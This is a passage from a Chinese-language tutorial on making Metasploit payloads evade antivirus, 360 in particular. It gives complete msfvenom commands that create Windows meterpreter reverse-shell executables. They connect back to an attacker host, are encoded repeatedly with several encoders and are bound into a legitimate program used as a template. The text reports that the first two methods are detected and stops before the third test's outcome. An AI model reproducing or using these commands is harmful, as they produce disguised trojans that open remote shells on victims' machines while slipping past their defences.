-l, –list [module_type] 列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all

**二、免杀制作**

**1、编码方式：**

    用msfvenom进行编码方式进行混淆，效果不好，编码过后的程序常常被杀软杀，更不提360那么强悍的杀软了。

  

如：

    使用x86/shikata\_ga\_nai生成payload，参数-i为编码次数，这里设置15次，并使用了-b参数去掉payload中的空字符。

msfvenom -p windows/meterpreter/reverse\_tcp LHOST=ip LPORT=3333 -e x86/shikata\_ga\_nai -b"\\x00" -i15 -fexe -o payload2.exe

  

但这样生成的payload2.exe并不能过掉360，一样会被杀。

  

    由于shikata\_ga\_nai编码技术是多态的，也就是说每次生成的payload文件都不⼀样，有时生成的文件会被查杀，有时却不会。当然这个也和编码次数有⼀定关系，编码次数好像超过70次就经常生成出错，但是编码次数多并不代表免杀能力强。

  

**2、捆绑方式：**

    在生成payload时可以使用捆绑功能，使用msfvenom的-x参数可以指定⼀个自定义的可执行文件作为模板,并将payload嵌入其中，-x后面跟对应文件路径就可以。这里使用一个正规的Display.exe作为被捆绑测试软件。生成payload命令如下：

msfvenom -p windows/meterpreter/reverse\_tcp LHOST=ip LPORT=3333 -x Display.exe -f exe -o payload2.exe

  

但这样生成的payload2.exe并不能过掉360，一样会被杀。

  

**3、编码+捆绑方式：**

    msfvenom的encoder编码器可以对payload进行⼀定程度免杀，同时还可以使用msfvenom多重编码功能，通过管道，让msfvenom用不同编码器反复编码进行混淆。如下命令，使用管道让msfvenom对攻击载荷多重编码，先用shikata\_ga\_nai编码20次，接着来10次的alpha\_upper编码，再来10次的countdown编码，最后才生成以Display.exe为模板的可执行文件。    

  

sudo msfvenom -p windows/meterpreter/reverse\_tcp LHOST=192.168.213.128 LPORT=3333 -a x86 --platform windows -e x86/shikata\_ga\_nai -i 20 -f raw | msfvenom -e x86/alpha\_upper -a x86 --platform windows -i 10 -f raw | msfvenom -e x86/countdown -a x86 --platform windows -i 10 -f exe -x DisplaySample.exe -k -o d128.exe

生成了d128.exe，我们放入360机器的win机器中运行，看看效果。
